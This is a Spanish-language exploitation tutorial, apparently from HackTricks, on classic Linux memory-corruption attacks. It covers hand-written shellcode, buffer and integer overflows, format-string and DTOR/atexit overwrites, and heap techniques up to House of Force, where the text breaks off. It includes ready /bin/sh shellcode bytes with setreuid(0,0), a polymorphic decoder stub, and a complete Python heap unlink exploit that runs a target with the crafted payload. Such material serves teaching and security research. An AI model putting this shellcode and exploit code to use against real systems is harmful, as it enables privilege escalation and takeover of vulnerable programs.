# Explotaci√≥n de Linux (B√°sico)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**productos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** ‚Äî> Nos devuelve un .o\
**ld assembly.o -o shellcodeout** ‚Äî> Nos da un ejecutable formado por el c√≥digo ensamblador y podemos sacar los opcodes con **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes

**Comprobar que la shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para confirmar que las llamadas al sistema se realizan correctamente, se debe compilar el programa anterior y las llamadas al sistema deben aparecer en **strace ./PROGRAMA\_COMPILADO**

Al crear shellcodes, se puede utilizar un truco. La primera instrucci√≥n es un salto a una llamada. La llamada ejecuta el c√≥digo original y tambi√©n coloca el EIP en la pila. Despu√©s de la instrucci√≥n de llamada, hemos colocado la cadena que necesitamos, por lo que con ese EIP podemos apuntar a la cadena y continuar ejecutando el c√≥digo.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando el Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Buscador de Huevos:**

Es un peque√±o c√≥digo que recorre las p√°ginas de memoria asociadas a un proceso en busca de la shellcode guardada all√≠ (busca alguna firma puesta en la shellcode). √ötil en los casos en los que solo se tiene un peque√±o espacio para inyectar c√≥digo.

**Shellcodes Polim√≥rficos**

Consisten en shells cifradas que tienen un peque√±o c√≥digo que las descifra y salta a √©l, usando el truco de Call-Pop, este ser√≠a un **ejemplo cifrado C√©sar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. M√©todos complementarios**

**Ret2Ret**

√ötil cuando no se puede insertar una direcci√≥n de stack en el EIP (se verifica que el EIP no contenga 0xbf) o cuando no se puede calcular la ubicaci√≥n de la shellcode. Sin embargo, si la funci√≥n vulnerable acepta un par√°metro (la shellcode ir√° aqu√≠).

Al cambiar el EIP por una direcci√≥n a un **ret**, se cargar√° la siguiente direcci√≥n (que es la direcci√≥n del primer argumento de la funci√≥n), es decir, se cargar√° la shellcode.

El exploit ser√≠a: SHELLCODE + Relleno (hasta EIP) + **\&ret** (los siguientes bytes de la pila apuntan al inicio de la shellcode ya que se coloca en la pila la direcci√≥n al par√°metro pasado).

Funciones como **strncpy** parecen eliminar de la pila la direcci√≥n donde se guardaba la shellcode una vez completadas, lo que imposibilita esta t√©cnica. La direcci√≥n pasada a la funci√≥n como argumento (la que guarda la shellcode) es modificada por un 0x00, por lo que al llamar al segundo **ret** se encuentra con un 0x00 y el programa se detiene.

**T√©cnica de Murat**

En Linux, todos los programas se mapean comenzando en 0xbfffffff.

Observando c√≥mo se construye la pila de un nuevo proceso en Linux, se puede desarrollar un exploit de manera que el programa se inicie en un entorno donde la √∫nica variable sea la shellcode. La direcci√≥n de esta variable se puede calcular como: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode).

De esta forma, se obtiene f√°cilmente la direcci√≥n donde se encuentra la variable de entorno con la shellcode.

Esto es posible gracias a que la funci√≥n execle permite crear un entorno que solo contenga las variables de entorno deseadas.

**Desbordamientos de enteros**

Estos desbordamientos ocurren cuando una variable no est√° preparada para manejar un n√∫mero tan grande como el que se le pasa, posiblemente debido a una confusi√≥n entre variables con y sin signo, por ejemplo:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
En el ejemplo anterior vemos que el programa se espera 2 par√°metros. El primero es la longitud de la siguiente cadena y el segundo es la cadena.

Si le pasamos un n√∫mero negativo como primer par√°metro, se mostrar√° que len < 256 y pasaremos ese filtro. Adem√°s, strlen(buffer) ser√° menor que l, ya que l es un unsigned int y ser√° muy grande.

Este tipo de desbordamientos no busca escribir algo en el proceso del programa, sino superar filtros mal dise√±ados para explotar otras vulnerabilidades.

**Variables no inicializadas**

No se sabe el valor que puede tomar una variable no inicializada y podr√≠a ser interesante observarlo. Puede ser que tome el valor que tomaba una variable de la funci√≥n anterior y esta sea controlada por el atacante.

##

###

###

###

### **.fini\_array**

B√°sicamente, esta es una estructura con **funciones que se llamar√°n** antes de que el programa finalice. Esto es interesante si puedes llamar a tu **shellcode simplemente saltando a una direcci√≥n**, o en casos en los que necesitas volver a main nuevamente para **explotar la cadena de formato por segunda vez**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Ten en cuenta que esto **no** crear√° un **bucle eterno** porque cuando regreses a la funci√≥n principal, el canario lo notar√°, el final de la pila podr√≠a corromperse y la funci√≥n no se volver√° a llamar. Por lo tanto, con esto podr√°s **tener 1 ejecuci√≥n m√°s** de la vulnerabilidad.

### **Formatear cadenas para volcar contenido**

Una cadena de formato tambi√©n puede ser abusada para **volcar contenido** de la memoria del programa.\
Por ejemplo, en la siguiente situaci√≥n hay una **variable local en la pila que apunta a una bandera**. Si **encuentras** en qu√© **direcci√≥n de memoria** est√° el **puntero** a la **bandera**, puedes hacer que **printf acceda** a esa **direcci√≥n** e **imprima** la **bandera**:

Entonces, la bandera est√° en **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Y a partir de la fuga puedes ver que el **puntero a la bandera** est√° en el **8vo** par√°metro:

![](<../../.gitbook/assets/image (623).png>)

Por lo tanto, **accediendo** al **8vo par√°metro** puedes obtener la bandera:

![](<../../.gitbook/assets/image (624).png>)

Ten en cuenta que siguiendo el **exploit anterior** y d√°ndote cuenta de que puedes **filtrar contenido**, puedes **establecer punteros** a **`printf`** en la secci√≥n donde se **carga** el **ejecutable** y **volcarlo** **completamente**!

### **DTOR**

{% hint style="danger" %}
Hoy en d√≠a es muy **raro encontrar un binario con una secci√≥n dtor**.
{% endhint %}

Los destructores son funciones que se **ejecutan antes de que el programa finalice**.\
Si logras **escribir** una **direcci√≥n** a un **shellcode** en **`__DTOR_END__`**, eso se **ejecutar√°** antes de que el programa termine.\
Obt√©n la direcci√≥n de esta secci√≥n con:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Por lo general, encontrar√°s la secci√≥n **DTOR** **entre** los valores `ffffffff` y `00000000`. Por lo tanto, si solo ves esos valores, significa que **no hay ninguna funci√≥n registrada**. Por lo tanto, **sobrescribe** el **`00000000`** con la **direcci√≥n** del **shellcode** para ejecutarlo.

### **Cadenas de formato para desbordamientos de b√∫fer**

La funci√≥n **sprintf** mueve una cadena formateada a una **variable**. Por lo tanto, podr√≠as abusar del **formateo** de una cadena para causar un **desbordamiento de b√∫fer en la variable** donde se copia el contenido.\
Por ejemplo, la carga √∫til `%.44xAAAA` **escribir√° 44B+"AAAA" en la variable**, lo que puede causar un desbordamiento de b√∫fer.

### **Estructuras \_\_atexit**

{% hint style="danger" %}
Hoy en d√≠a es muy **raro explotar esto**.
{% endhint %}

**`atexit()`** es una funci√≥n a la que se le pasan **otras funciones como par√°metros**. Estas **funciones** se ejecutar√°n al ejecutar un **`exit()`** o al **retornar** del **main**.\
Si puedes **modificar** la **direcci√≥n** de cualquiera de estas **funciones** para que apunte a un shellcode, por ejemplo, **obtendr√°s el control** del **proceso**, pero actualmente es m√°s complicado.\
Actualmente, las **direcciones de las funciones** que se ejecutar√°n est√°n **ocultas** detr√°s de varias estructuras y finalmente las direcciones a las que apuntan no son las direcciones de las funciones, sino que est√°n **encriptadas con XOR** y desplazamientos con una **clave aleatoria**. Por lo tanto, actualmente este vector de ataque **no es muy √∫til al menos en x86** y **x64\_86**.\
La funci√≥n de **encriptaci√≥n** es **`PTR_MANGLE`**. **Otras arquitecturas** como m68k, mips32, mips64, aarch64, arm, hppa... **no implementan la funci√≥n de encriptaci√≥n** porque **devuelve lo mismo** que recibe como entrada. Por lo tanto, estas arquitecturas podr√≠an ser atacadas por este vector.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Hoy en d√≠a es muy **raro explotar esto**.
{% endhint %}

**`Setjmp()`** permite **guardar** el **contexto** (los registros)\
**`longjmp()`** permite **restaurar** el **contexto**.\
Los **registros guardados** son: `EBX, ESI, EDI, ESP, EIP, EBP`\
Lo que sucede es que EIP y ESP son pasados por la funci√≥n **`PTR_MANGLE`**, por lo que las **arquitecturas vulnerables a este ataque son las mismas que las mencionadas anteriormente**.\
Son √∫tiles para la recuperaci√≥n de errores o interrupciones.\
Sin embargo, por lo que he le√≠do, los otros registros no est√°n protegidos, **por lo que si hay un `call ebx`, `call esi` o `call edi`** dentro de la funci√≥n llamada, se puede tomar el control. O tambi√©n se podr√≠a modificar EBP para modificar ESP.

**VTable y VPTR en C++**

Cada clase tiene una **Vtable** que es un array de **punteros a m√©todos**.

Cada objeto de una **clase** tiene un **VPtr** que es un **puntero** al array de su clase. El VPtr es parte del encabezado de cada objeto, por lo que si se logra **sobrescribir** el **VPtr** se podr√≠a **modificar** para **apuntar** a un m√©todo ficticio para que al ejecutar una funci√≥n vaya al shellcode.

## **Medidas preventivas y evasiones**

###

**Reemplazo de Libsafe**

Se activa con: LD\_PRELOAD=/lib/libsafe.so.2\
o\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Se interceptan las llamadas a algunas funciones inseguras por otras seguras. No est√° estandarizado. (solo para x86, no para compilaxiones con -fomit-frame-pointer, no compilaciones est√°ticas, no todas las funciones vulnerables se vuelven seguras y LD\_PRELOAD no sirve en binarios con suid).

**ASCII Armored Address Space**

Consiste en cargar las librer√≠a compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene a penas ning√∫n ataque, y menos en little endian.

**ret2plt**

Consiste en realiza un ROP de forma que se llame a la funci√≥n strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la funci√≥n a la que se quiere llamar (system()). Acto seguido se hace lo mismo apuntando a GOT+1 y se copia el 2¬∫byte de system()‚Ä¶ Al final se llama la direcci√≥n guardada en GOT que ser√° system()

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala un sistema b√°sico bajo un subdirectorio espec√≠fico

Un admin puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..

**Instrumentaci√≥n de c√≥digo**

Valgrind ‚Äî> Busca errores\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits b√°sicos**

**Trozo asignado**

prev\_size |\
size | ‚ÄîCabecera\
\*mem | Datos

**Trozo libre**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk ‚ÄîCabecera\
\*mem | Datos

Los trozos libres est√°n en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan)

En ‚Äúsize‚Äù hay bits para indicar: Si el trozo anterior est√° en uso, si el trozo ha sido asignado mediante mmap() y si el trozo pertenece al arena primario.

Si al liberar un trozo alguno de los contiguos se encuentra libre , estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo m√°s grande a frontlink() para que le inserte el bin adecuado.

unlink(){\
BK = P->bk; ‚Äî> El BK del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD = P->fd; ‚Äî> El FD del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD->bk = BK; ‚Äî> El BK del siguiente chunk apunta al nuevo chunk\
BK->fd = FD; ‚Äî> El FD del anterior chunk apunta al nuevo chunk\
}

Por lo tanto si conseguimos modificar el P->bk con la direcci√≥n de un shellcode y el P->fd con la direcci√≥n a una entrada en la GOT o DTORS menos 12 se logra:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Y as√≠ se se ejecuta al salir del programa la shellcode.

Adem√°s, la 4¬∫ sentencia de unlink() escribe algo y la shellcode tiene que estar reparada para esto:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Esto provoca la escritura de 4 bytes a partir del 8¬∫ byte de la shellcode, por lo que la primera instrucci√≥n de la shellcode debe ser un jmp para saltar esto y caer en unos nops que lleven al resto de la shellcode.

Por lo tanto el exploit se crea:

En el buffer1 metemos la shellcode comenzando por un jmp para que caiga en los nops o en el resto de la shellcode.

Despu√©s de la shell code metemos relleno hasta llegar al campo prev\_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev\_size para que tenga el bit que dice que est√° libre) y ‚Äú-4‚Äú(0xfffffffc) en el size (para que cuando compruebe en el 3¬∫ trozo si el 2¬∫ estaba libre en realidad vaya al prev\_size modificado que le dir√° que s¬¥est√° libre) -> As√≠ cuando free() investigue ir√° al size del 3¬∫ pero en realidad ir√° al 2¬∫ - 4 y pensar√° que el 2¬∫ trozo est√° libre. Y entonces llamar√° a **unlink()**.

Al llamar a unlink() usar√° como P->fd los primeros datos del 2¬∫ trozo por lo que ah√≠ se meter√° la direcci√≥n que se quieres sobreescribir - 12(pues en FD->bk le sumar√° 12 a la direcci√≥n guardada en FD) . Y en esa direcci√≥n introducir√° la segunda direcci√≥n que encuentre en el 2¬∫ trozo, que nos interesar√° que sea la direcci√≥n a la shellcode(P->bk falso).

**from struct import \***

**import os**
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV\_INUSE desactivado de forma que piense que el chunck a est√° libre.

Adem√°s, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensar√° que ‚Äúa‚Äù est√° libre y en un bin, por lo que llamar√° a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV\_SIZE vale -4. Se pensar√° que el trozo de ‚Äúa‚Äù realmente empieza en b+4. Es decir, har√° un unlink() a un trozo que comienza en b+4, por lo que en b+12 estar√° el puntero ‚Äúfd‚Äù y en b+16 estar√° el puntero ‚Äúbk‚Äù.

De esta forma, si en bk ponemos la direcci√≥n a la shellcode y en fd ponemos la direcci√≥n a la funci√≥n ‚Äúputs()‚Äù-12 tenemos nuestro payload.

**T√©cnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad √∫til cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la funci√≥n de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificar√° el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tama√±o mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev\_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma direcci√≥n.

En caso de querer volver a usar uno se asignar√≠a sin problemas. En caso de querer usar otro, se le asignar√≠a el mismo espacio por lo que tendr√≠amos los punteros ‚Äúfd‚Äù y ‚Äúbk‚Äù falseados con los datos que escribir√° la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las t√©cnicas de Unlink() y FrontLink() fueron eliminadas al modificar la funci√≥n unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecuci√≥n de c√≥digo arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Devuelve un puntero a la direcci√≥n donde comienza el trozo (mem-8)

‚Ä¶

ar\_ptr = arena\_for_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobaci√≥n devuelva true y ejecute heap\_for\_ptr() que hace un and a ‚Äúmem‚Äù dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)

De esta forma si podemos controlar un trozo por ejemplo en 0x0804a000 y se va a liberar un trozo en **0x081002a0** podemos llegar a la direcci√≥n 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando este segundo trozo se libere se encontrar√° que heap\_for\_ptr(ptr)->ar\_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ah√≠ se saca el valor de los 4 primeros bytes, el ar\_ptr)

De esta forma se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como hemos visto antes podemos controlar el valor de av, pues es lo que escribimos en el trozo que se va a liberar.

Tal y como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto si en av->bins\[2] escribimos el valor de \_\_DTOR\_END\_\_-12 en la √∫ltima instrucci√≥n se escribir√° en \_\_DTOR\_END\_\_ la direcci√≥n del segundo trozo.

Es decir, en el primer trozo tenemos que poner al inicio muchas veces la direcci√≥n de \_\_DTOR\_END\_\_-12 porque de ah√≠ la sacar√° av->bins\[2]

En la direcci√≥n que caiga la direcci√≥n del segundo trozo con los √∫ltimos 5 ceros hay que escribir la direcci√≥n a este primer trozo para que heap\_for\_ptr() piense que el ar\_ptr est√° al inicio del primer trozo y saque de ah√≠ el av->bins\[2]

En el segundo trozo y gracias al primero sobreescribimos el prev\_size con un jump 0x0c y el size con algo para activar -> NON\_MAIN\_ARENA

A continuaci√≥n en el trozo 2 ponemos un mont√≥n de nops y finalmente la shellcode

De esta forma se llamar√° a \_int\_free(TROZO1, TROZO2) y seguir√° las instrucciones para escribir en \_\_DTOR\_END\_\_ la direcci√≥n del prev\_size del TROZO2 el cual saltar√° a la shellcode.
Para apply esta t√©cnica se requiere que se cumplan algunos requisitos adicionales que complican un poco m√°s el payload.

Esta t√©cnica ya no es aplicable ya que se aplic√≥ casi el mismo parche que para unlink. Se comparan si el nuevo sitio al que se apunta tambi√©n le est√° apuntando a √©l.

**Fastbin**

Es una variante de The house of mind

nos interesa llegar a ejecutar el siguiente c√≥digo al cu√°l se llega pasada la primera comprobaci√≥n de la funci√≥n \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Siendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

De esta forma si se pone en ‚Äúfb‚Äù da direcci√≥n de una funci√≥n en la GOT, en esta direcci√≥n se pondr√° la direcci√≥n al trozo sobrescrito. Para esto ser√° necesario que la arena est√© cerca de las direcciones de dtors. M√°s exactamente que av->max\_fast est√© en las direcci√≥n que vamos a sobreescribir.

Dado que con The House of Mind se vio que nosotros control√°bamos la posici√≥n del av.

Entones si en el campo size ponemos un tama√±o de 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() nos devolver√° fastbins\[-1], que apuntar√° a av->max\_fast

En este caso av->max\_fast ser√° la direcci√≥n que se sobrescrita (no a la que apunte, sino esa posici√≥n ser√° la que se sobrescrita).

Adem√°s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -> Dado que hemos dicho que el size del trozo liberado es 8, en este trozo falso solo tenemos que poner un size mayor que 8 (como adem√°s la shellcode ir√° en el trozo liberado, habr√° que poner al ppio un jmp que caiga en nops).

Adem√°s, ese mismo trozo falso debe ser menor que av->system\_mem. av->system\_mem se encuentra 1848 bytes m√°s all√°.

Por culpa de los nulos de \_DTOR\_END\_ y de las pocas direcciones en la GOT, ninguna direcci√≥n de estas secciones sirven para ser sobrescritas, as√≠ que veamos como aplicar fastbin para atacar la pila.

Otra forma de ataque es redirigir el **av** hacia la pila.

Si modificamos el size para que de 16 en vez de 8 entonces: fastbin\_index() nos devolver√° fastbins\[0] y podemos hacer uso de esto para sobreescribir la pila.

Para esto no debe haber ning√∫n canary ni valores raros en la pila, de hecho tenemos que encontrarnos en esta: 4bytes nulos + EBP + RET

Los 4 bytes nulo se necesitan que el **av** estar√° a esta direcci√≥n y el primero elemento de un **av** es el mutexe que tiene que valer 0.

El **av->max\_fast** ser√° el EBP y ser√° un valor que nos servir√° para saltarnos las restricciones.

En el **av->fastbins\[0]** se sobreescribir√° con la direcci√≥n de **p** y ser√° el RET, as√≠ se saltar√° a la shellcode.

Adem√°s, en **av->system\_mem** (1484bytes por encima de la posici√≥n en la pila) habr√° bastante basura que nos permitir√° saltarnos la comprobaci√≥n que se realiza.

Adem√°s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -> Dado que hemos dicho que el size del trozo liberado es 16, en este trozo falso solo tenemos que poner un size mayor que 8 (como adem√°s la shellcode ir√° en el trozo liberado, habr√° que poner al ppio un jmp que caiga en nops que van despu√©s del campo size del nuevo trozo falso).

**The House of Spirit**

En este caso buscamos tener un puntero a un malloc que pueda ser alterable por el atacante (por ej, que el puntero est√© en el stack debajo de un posible overflow a una variable).

As√≠, podr√≠amos hacer que este puntero apuntase a donde fuese. Sin embargo, no cualquier sitio es v√°lido, el tama√±o del trozo falseado debe ser menor que av->max\_fast y m√°s espec√≠ficamente igual al tama√±o solicitado en una futura llamada a malloc()+8. Por ello, si sabemos que despu√©s de este puntero vulnerable se llama a malloc(40), el tama√±o del trozo falso debe ser igual a 48.

Si por ejemplo el programa preguntase al usuario por un n√∫mero podr√≠amos introducir 48 y apuntar el puntero de malloc modificable a los siguientes 4bytes (que podr√≠an pertenecer al EBP con suerte, as√≠ el 48 queda por detr√°s, como si fuese la cabecera size). Adem√°s, la direcci√≥n ptr-4+48 debe cumplir varias condiciones (siendo en este caso ptr=EBP), es decir, 8 < ptr-4+48 < av->system\_mem.

En caso de que esto se cumpla, cuando se llame al siguiente malloc que dijimos que era malloc(40) se le asignar√° como direcci√≥n la direcci√≥n del EBP. En caso de que el atacante tambi√©n pueda controlar lo que se escribe en este malloc puede sobreescribir tanto el EBP como el EIP con la direcci√≥n que quiera.

Esto creo que es porque as√≠ cuando lo libere free() guardar√° que en la direcci√≥n que apunta al EBP del stack hay un trozo de tama√±o perfecto para el nuevo malloc() que se quiere reservar, as√≠ que le asigna esa direcci√≥n.

**The House of Force**

Es necesario:

* Un overflow a un trozo que permita sobreescribir el wilderness
* Una llamada a malloc() con el tama√±o definido por el usuario
* Una llamada a malloc() cuyos datos puedan ser definidos por el usuario

Lo primero que se hace es sobreescribir el size del trozo wilderness con un valor muy grande (0xffffffff), as√≠ cualquiera solicitud de memoria lo suficientemente grande ser√° tratada en \_int\_malloc() sin necesidad de expandir el heap

Lo segundo es alterar el av->top para que apunte a una zona de memoria bajo el control del atacante, como el stack. En av->top se pondr√° \&EIP - 8.

Tenemos que sobreescrbir av->top para que apunte a la zona de memoria bajo el control del atacante:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim recoge el valor de la direcci√≥n del trozo wilderness actual (el actual av->top) y remainder es exactamente la suma de esa direcci√≥n m√°s la cantidad de bytes solicitados por malloc(). Por lo que si \&EIP-8 est√° en 0xbffff224 y av->top contiene 0x080c2788, entonces la cantidad que tenemos que reservar en el malloc controlado para que av->top quede apuntando a $EIP-8 para el pr√≥ximo malloc() ser√°:

